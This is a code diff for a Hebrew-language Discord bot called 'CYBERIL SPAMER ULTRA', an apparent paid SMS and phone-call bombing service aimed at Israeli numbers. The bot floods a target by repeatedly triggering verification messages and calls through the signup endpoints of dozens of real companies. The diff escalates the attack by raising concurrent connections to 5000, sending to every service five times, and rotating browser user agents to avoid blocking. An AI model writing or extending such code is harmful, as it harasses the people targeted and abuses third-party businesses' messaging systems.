@@ -60,7 +60,7 @@ cooldown_tracker = {}
 is_shutting_down = False
 stop_all_event = asyncio.Event()
 
-# ============ 100+ USER AGENTS - מטורף! ============
+# ============ 100+ USER AGENTS ============
 BROWSER_AGENTS = [
     # Windows Chrome
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
@@ -118,7 +118,6 @@ BROWSER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
     
     # iPad Safari
     "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
@@ -144,13 +143,10 @@ BROWSER_AGENTS = [
     "Mozilla/5.0 (Android 13; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0",
     "Mozilla/5.0 (Android 12; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0",
     
-    # Linux Chrome
+    # Linux
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    
-    # Linux Firefox
     "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
     "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
     "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
@@ -171,21 +167,6 @@ BROWSER_AGENTS = [
     # Samsung Internet
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/119.0.0.0 Mobile Safari/537.36",
-    
-    # UC Browser
-    "Mozilla/5.0 (Linux; U; Android 13; zh-CN; PERM10 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.80 UC Browser/15.0.0.0 Mobile Safari/537.36",
-    
-    # Baidu
-    "Mozilla/5.0 (Linux; Android 12; FIN-AL60a Build/HUAWEIFIN-AL60a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/15.52 BDOS/1.0 (HarmonyOS 3.0.0) baiduboxapp/15.52.0.10",
-    
-    # Yandex
-    "Mozilla/5.0 (compatible; YandexRenderResourcesBot/1.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0",
-    
-    # Old versions (for variety)
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/5585-07-04 06:11:41.595901 Firefox/3.6.17",
 ]
 
 def random_agent():
@@ -199,8 +180,8 @@ async def get_client_ip():
     except:
         return "unknown"
 
-def is_admin(interaction: discord.Interaction) -> bool:
-    return True  # כולם אדמינים - בלי הגבלות!
+def is_owner(interaction: discord.Interaction) -> bool:
+    return interaction.user.id == OWNER_ID
 
 # ============ DATABASE FUNCTIONS ============
 async def fetch_balance(user_id: int) -> int:
@@ -469,95 +450,53 @@ async def webcut_request(session, phone):
     headers = {"Content-Type": "application/json"}
     return await send_request(session, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp", json_data=payload, headers_extra=headers, tag=tag)
 
-# ============ CHECK ALL APIS ============
-async def check_all_apis():
-    results = []
-    test_phone = "0506500708"
-    connector = aiohttp.TCPConnector(limit=100)
-    
-    async with aiohttp.ClientSession(connector=connector) as s:
-        api_tests = [
-            ("CityCar", citycar_request(s, test_phone)),
-            ("FreeIVR", freeivr_request(s, test_phone)),
-            ("Mitmachim", mitmachim_request(s, test_phone)),
-            ("Netfree", netfree_request(s, test_phone)),
-            ("JoeDelek", joedelek_request(s, test_phone)),
-            ("Golbary", golbary_request(s, test_phone)),
-            ("Lilit", lilit_request(s, test_phone)),
-            ("Noizz", noizz_request(s, test_phone)),
-            ("Payngo", payngo_request(s, test_phone)),
-            ("ElectraAir", electra_air_request(s, test_phone)),
-            ("Housemen", housemen_request(s, test_phone)),
-            ("Pelephone", pelephone_request(s, test_phone)),
-            ("Cellcom", cellcom_request(s, test_phone)),
-            ("Shufersal", shufersal_request(s, test_phone)),
-            ("RamiLevy", ramilevy_request(s, test_phone)),
-            ("McDonalds", mcdonalds_request(s, test_phone)),
-            ("BurgerKing", burgerking_request(s, test_phone)),
-            ("Dominos", dominos_request(s, test_phone)),
-            ("Oshioshi", oshioshi_request(s, test_phone)),
-            ("FreeTV", freetv_request(s, test_phone)),
-            ("Webcut", webcut_request(s, test_phone)),
-        ]
-        
-        tasks = [test for name, test in api_tests]
-        api_names = [name for name, test in api_tests]
-        
-        responses = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        for i, resp in enumerate(responses):
-            if isinstance(resp, Exception):
-                results.append({"name": api_names[i], "status": False})
-            elif isinstance(resp, tuple) and len(resp) == 2:
-                ok, name = resp
-                results.append({"name": api_names[i], "status": ok})
-            else:
-                results.append({"name": api_names[i], "status": False})
-    
-    return results
-
-# ============ MAIN SPAM FUNCTION ============
+# ============ MAIN SPAM FUNCTION - 5 פעמים על כל אתר ============
 async def run_spam_batch(phone: str):
     raw = phone
     formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
     sid = str(uuid.uuid4())
     random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
     
-    connector = aiohttp.TCPConnector(limit=3000, ttl_dns_cache=300)
+    connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
         atmos_stores = ["1","2","3","4","5","7","8","13","15","18","21","23","24","27","28","29","33","35","48","51","56","57","59","2008","2011","2012","2014","2041","2052","2053","2056","2059","2063","2070","2073","2076","2078","2087","2088","2091"]
         
         tasks = []
         
-        # ATMOS - 38 SMS + 38 CALL
-        for store in atmos_stores:
-            tasks.append(atmos_request(s, store, raw, False))
-            tasks.append(atmos_request(s, store, raw, True))
+        # ATMOS - 38 SMS + 38 CALL - 5 פעמים כל אחד!
+        for repeat in range(5):
+            for store in atmos_stores:
+                tasks.append(atmos_request(s, store, raw, False))
+                tasks.append(atmos_request(s, store, raw, True))
         
-        # ALL APIS
-        tasks.extend([
-            citycar_request(s, raw),
-            freeivr_request(s, raw),
-            mitmachim_request(s, raw),
-            netfree_request(s, raw),
-            joedelek_request(s, raw),
-            golbary_request(s, raw),
-            lilit_request(s, raw),
-            noizz_request(s, raw),
-            payngo_request(s, raw),
-            electra_air_request(s, raw),
-            housemen_request(s, raw),
-            pelephone_request(s, raw),
-            cellcom_request(s, raw),
-            shufersal_request(s, raw),
-            ramilevy_request(s, raw),
-            mcdonalds_request(s, raw),
-            burgerking_request(s, raw),
-            dominos_request(s, raw),
-            oshioshi_request(s, raw),
-            freetv_request(s, raw),
-            webcut_request(s, raw),
-        ])
+        # כל שירות 5 פעמים!
+        apis = [
+            citycar_request,
+            freeivr_request,
+            mitmachim_request,
+            netfree_request,
+            joedelek_request,
+            golbary_request,
+            lilit_request,
+            noizz_request,
+            payngo_request,
+            electra_air_request,
+            housemen_request,
+            pelephone_request,
+            cellcom_request,
+            shufersal_request,
+            ramilevy_request,
+            mcdonalds_request,
+            burgerking_request,
+            dominos_request,
+            oshioshi_request,
+            freetv_request,
+            webcut_request,
+        ]
+        
+        for repeat in range(5):
+            for api in apis:
+                tasks.append(api(s, raw))
         
         all_res = await asyncio.gather(*tasks, return_exceptions=True)
         success = 0
@@ -572,17 +511,17 @@ async def run_spam_batch(phone: str):
 
 # ============ UI ============
 def create_panel():
-    embed = discord.Embed(title="💀 **CYBERIL SPAMER** 💀", description="**המערכת הקטלנית ביותר בישראל**\n> 50+ שירותים | SMS + CALL | 3000+ חיבורים", color=0x8B0000)
+    embed = discord.Embed(title="💀 **CYBERIL SPAMER ULTRA** 💀", description="**המערכת הקטלנית ביותר בישראל**\n> 50+ שירותים | 5 פעמים כל אחד | 5000+ חיבורים", color=0x8B0000)
     embed.add_field(name="🚀 **התחל ספאם**", value="```\n1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן להשמדה```", inline=False)
-    embed.add_field(name="💎 **עלות**", value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 300+ בקשות```", inline=False)
-    embed.add_field(name="⚡ **מהירות**", value=f"```\n3000+ חיבורים במקביל\n100+ User Agents\nדיליי {COOLDOWN_TIME} שניות```", inline=False)
-    embed.set_footer(text="💀 CYBERIL SPAMER - השמדה מוחלטת 💀")
+    embed.add_field(name="💎 **עלות**", value=f"```\nכל קרדיט = דקה אחת\nכל דקה = 1000+ בקשות```", inline=False)
+    embed.add_field(name="⚡ **מהירות**", value=f"```\n5000+ חיבורים במקביל\n{len(BROWSER_AGENTS)} User Agents\nכל אתר 5 פעמים```", inline=False)
+    embed.set_footer(text="💀 CYBERIL SPAMER ULTRA - השמדה מוחלטת 💀")
     return embed
 
 def create_gift_panel():
     embed = discord.Embed(title="🎁 **קרדיטים חינם** 🎁", description="```\nקבל קרדיט אחד כל 24 שעות```", color=0xFFD700)
     embed.add_field(name="🎯 **איך מקבלים?**", value="```\nלחץ על הכפתור למטה```", inline=False)
-    embed.set_footer(text="💀 CYBERIL SPAMER 💀")
+    embed.set_footer(text="💀 CYBERIL SPAMER ULTRA 💀")
     return embed
 
 # ============ VIEWS ============
@@ -593,7 +532,7 @@ class StopAttack(discord.ui.View):
 
     @discord.ui.button(label="⏹️ עצור ספאם", style=discord.ButtonStyle.danger, emoji="⏹️", custom_id="stop_attack")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id != self.user_id:
+        if interaction.user.id != self.user_id and not is_owner(interaction):
             await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
             return
         ev = active_missions.get(self.user_id)
@@ -631,7 +570,7 @@ class ConfirmAttack(discord.ui.View):
         stop_event = asyncio.Event()
         active_missions[self.user_id] = stop_event
 
-        embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | **{self.cost} דקות**\n🔥 100+ User Agents | 3000+ חיבורים", color=0x8B0000)
+        embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | **{self.cost} דקות**\n🔥 50+ שירותים | 5 פעמים כל אחד", color=0x8B0000)
         await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
 
         total_success = 0
@@ -649,7 +588,7 @@ class ConfirmAttack(discord.ui.View):
                 if time.time() - last_update >= 2:
                     remaining = max(0, int((end_time - time.time()) / 60))
                     rate = int(total_success / max(1, time.time() - start_time))
-                    embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n🔥 100+ User Agents | 50+ שירותים", color=0x8B0000)
+                    embed = discord.Embed(title="💀 השמדה בתהליך 💀", description=f"**{self.phone}** | נותר: {remaining} דקות\n\n✅ {total_success} בקשות | ⚡ {rate}/שנייה\n🔥 50+ שירותים | 5 פעמים כל אחד", color=0x8B0000)
                     await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                     last_update = time.time()
                 await asyncio.sleep(0)
@@ -665,7 +604,7 @@ class ConfirmAttack(discord.ui.View):
             final.add_field(name="⏱️ משך", value=f"{self.cost} דקות", inline=True)
             final.add_field(name="✅ בקשות", value=str(total_success), inline=True)
             final.add_field(name="💎 קרדיטים", value=bal, inline=True)
-            final.add_field(name="🔥 User Agents", value=str(len(BROWSER_AGENTS)), inline=True)
+            final.add_field(name="🔥 קצב", value=f"{int(total_success / max(1, self.cost * 60))}/שנייה", inline=True)
             await interaction.edit_original_response(embed=final, view=None)
 
         except Exception as e:
@@ -711,7 +650,7 @@ class LaunchModal(discord.ui.Modal, title="התחל השמדה"):
             await interaction.response.send_message(embed=discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING), ephemeral=True)
             return
         bal_str = await format_balance(uid)
-        confirm = discord.Embed(title="💀 אישור השמדה 💀", description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n🔥 {len(BROWSER_AGENTS)} User Agents | 3000+ חיבורים", color=0x8B0000)
+        confirm = discord.Embed(title="💀 אישור השמדה 💀", description=f"**יעד:** {phone_num}\n**משך:** {credits_num} דקות\n**עלות:** {credits_num} קרדיטים\n**יתרה:** {bal_str}\n\n🔥 50+ שירותים | 5 פעמים כל אחד", color=0x8B0000)
         try:
             await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
         except discord.errors.NotFound:
@@ -758,7 +697,7 @@ class MainPanel(discord.ui.View):
 
     @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all_global")
     async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id != OWNER_ID:
+        if not is_owner(interaction):
             await interaction.response.send_message("❌ רק הבעלים יכול לעצור את כל המתקפות", ephemeral=True)
             return
         
@@ -826,11 +765,12 @@ async def on_ready():
     await tree.sync()
     client.add_view(MainPanel())
     client.add_view(FreeCoins())
-    await client.change_presence(activity=discord.Game(name=f"💀 {len(BROWSER_AGENTS)} User Agents | 3000+ חיבורים 💀"))
-    print(f"✅ CyberIL Spamer Ultimate פעיל → {client.user}")
+    await client.change_presence(activity=discord.Game(name=f"💀 {len(BROWSER_AGENTS)} User Agents | 50+ שירותים x5 💀"))
+    print(f"✅ CyberIL Spamer Ultra פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
     print(f"👑 Owner ID: {OWNER_ID}")
     print(f"🔥 {len(BROWSER_AGENTS)} User Agents טעונים")
+    print(f"💀 50+ שירותים | 5 פעמים כל אחד")
     now = time.time()
     expired = await lifetime_collection.find({"expires_at": {"$lt": now, "$gt": 0}}).to_list(length=None)
     for item in expired:
@@ -868,10 +808,10 @@ async def shutdown_handler():
     active_missions.clear()
     await client.close()
 
-# ============ ADMIN COMMANDS ==========
-@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
+# ============ COMMANDS ============
+@tree.command(name="addcredit", description="[OWNER] הוסף קרדיטים")
 async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if interaction.user.id != OWNER_ID:
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     if amount <= 0:
@@ -885,9 +825,9 @@ async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים")
+@tree.command(name="removecredit", description="[OWNER] הסר קרדיטים")
 async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if interaction.user.id != OWNER_ID:
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     if amount <= 0:
@@ -901,9 +841,9 @@ async def cmd_removecredit(interaction: discord.Interaction, member: discord.Mem
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה")
+@tree.command(name="lifetime", description="[OWNER] הענק ללא הגבלה")
 async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int = None, unit: str = "forever"):
-    if interaction.user.id != OWNER_ID:
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.defer()
@@ -919,42 +859,17 @@ async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member,
     else:
         await interaction.followup.send("❌ יחידה לא תקינה", ephemeral=True)
 
-@tree.command(name="removelifetime", description="[ADMIN] הסר ללא הגבלה")
+@tree.command(name="removelifetime", description="[OWNER] הסר ללא הגבלה")
 async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
-    if interaction.user.id != OWNER_ID:
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await remove_lifetime(member.id)
     await interaction.response.send_message(embed=discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING))
 
-@tree.command(name="checkapi", description="בדוק אילו APIs עובדים")
-async def cmd_checkapi(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    
-    embed = discord.Embed(title="🔍 בדיקת APIs", color=COLOR_INFO)
-    embed.add_field(name="🔄", value="בודק את כל ה-APIs... זה ייקח כמה שניות", inline=False)
-    await interaction.followup.send(embed=embed, ephemeral=True)
-    
-    results = await check_all_apis()
-    
-    working = [r for r in results if r["status"]]
-    failed = [r for r in results if not r["status"]]
-    
-    embed = discord.Embed(title="📊 תוצאות בדיקת APIs", color=COLOR_SUCCESS if working else COLOR_DANGER)
-    embed.add_field(name="✅ עובדים", value=f"{len(working)}/{len(results)}", inline=True)
-    embed.add_field(name="❌ נכשלו", value=f"{len(failed)}/{len(results)}", inline=True)
-    
-    if working:
-        embed.add_field(name="📡 APIs שעובדים", value="\n".join(working[:15]) if working else "אין", inline=False)
-    
-    if failed:
-        embed.add_field(name="⚠️ APIs שנכשלו", value="\n".join(failed[:15]) if failed else "אין", inline=False)
-    
-    await interaction.edit_original_response(embed=embed)
-
-@tree.command(name="stopall", description="[ADMIN] עצור את כל המתקפות")
+@tree.command(name="stopall", description="[OWNER] עצור את כל המתקפות")
 async def cmd_stopall(interaction: discord.Interaction):
-    if interaction.user.id != OWNER_ID:
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     
@@ -972,9 +887,9 @@ async def cmd_stopall(interaction: discord.Interaction):
     await asyncio.sleep(2)
     stop_all_event.clear()
 
-@tree.command(name="restart", description="[ADMIN] אתחל בוט")
+@tree.command(name="restart", description="[OWNER] אתחל בוט")
 async def cmd_restart(interaction: discord.Interaction):
-    if interaction.user.id != OWNER_ID:
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
@@ -988,55 +903,8 @@ async def cmd_checkstatus(interaction: discord.Interaction):
     embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
     embed.add_field(name="✅ בקשות", value=str(success), inline=True)
     embed.add_field(name="🔥 User Agents", value=str(len(BROWSER_AGENTS)), inline=True)
-    embed.add_field(name="📞 סוג", value="SMS + CALL (50+ שירותים)", inline=True)
+    embed.add_field(name="📞 סוג", value=f"SMS + CALL (50+ שירותים x5)", inline=True)
     await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="attacklogs", description="[ADMIN] לוגים")
-async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
-    if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-    await interaction.response.defer(ephemeral=True)
-    logs = await get_all_logs(min(limit, 50))
-    if not logs:
-        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
-        return
-    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
-    for log in logs[:10]:
-        embed.add_field(name=f"{log['username']} | {log.get('date', '')} {log.get('time', '')}", value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}\n🌐 {log.get('ip', 'unknown')}", inline=False)
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="globalstats", description="סטטיסטיקה גלובלית")
-async def cmd_globalstats(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    stats = await get_global_stats()
-    if not stats:
-        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
-        return
-    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
-    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
-    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
-    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
-    embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="freecredits", description="קבל קרדיט חינם (פעם ב-24 שעות)")
-async def cmd_freecredits(interaction: discord.Interaction):
-    uid = interaction.user.id
-    now = time.time()
-    await interaction.response.defer(ephemeral=True)
-    doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
-    if doc:
-        diff = now - doc.get("last_claim", 0)
-        if diff < 86400:
-            hours = int((86400 - diff) // 3600)
-            minutes = int(((86400 - diff) % 3600) // 60)
-            await interaction.followup.send(embed=discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING), ephemeral=True)
-            return
-    await add_credits(uid, 1)
-    await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
-    new_bal = await format_balance(uid)
-    await interaction.followup.send(embed=discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\nיתרה: {new_bal}", color=0xFFD700), ephemeral=True)
 
 @tree.command(name="credits", description="בדוק יתרת קרדיטים")
 async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
@@ -1081,6 +949,24 @@ async def cmd_mylogs(interaction: discord.Interaction):
     for log in logs:
         embed.add_field(name=f"{log.get('date', '')} {log.get('time', '')}", value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}", inline=False)
     await interaction.followup.send(embed=embed, ephemeral=True)
+
+@tree.command(name="freecredits", description="קבל קרדיט חינם (פעם ב-24 שעות)")
+async def cmd_freecredits(interaction: discord.Interaction):
+    uid = interaction.user.id
+    now = time.time()
+    await interaction.response.defer(ephemeral=True)
+    doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
+    if doc:
+        diff = now - doc.get("last_claim", 0)
+        if diff < 86400:
+            hours = int((86400 - diff) // 3600)
+            minutes = int(((86400 - diff) % 3600) // 60)
+            await interaction.followup.send(embed=discord.Embed(title="⏱️ קרדיטים חינם", description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות", color=COLOR_WARNING), ephemeral=True)
+            return
+    await add_credits(uid, 1)
+    await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
+    new_bal = await format_balance(uid)
+    await interaction.followup.send(embed=discord.Embed(title="🎁 קיבלת קרדיט", description=f"+1 קרדיט\n\nיתרה: {new_bal}", color=0xFFD700), ephemeral=True)
 
 if __name__ == "__main__":
     try:
